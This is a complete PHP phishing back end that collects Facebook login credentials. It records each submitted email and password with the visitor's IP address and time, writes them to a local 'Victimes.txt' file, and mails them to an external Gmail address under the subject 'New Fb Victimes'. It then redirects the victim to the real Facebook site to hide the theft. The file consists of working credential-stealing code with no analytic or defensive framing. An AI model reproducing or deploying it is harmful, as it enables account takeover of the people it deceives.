<?php


$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "Powered by Muhammad Saadoon\n";
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "muhammad25820041@gmail.com";
$subject = "New Fb Victimes | $ip";
$headers = "From: New Fb Victimes";
$file = fopen("Victimes.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.facebook.com/");

?>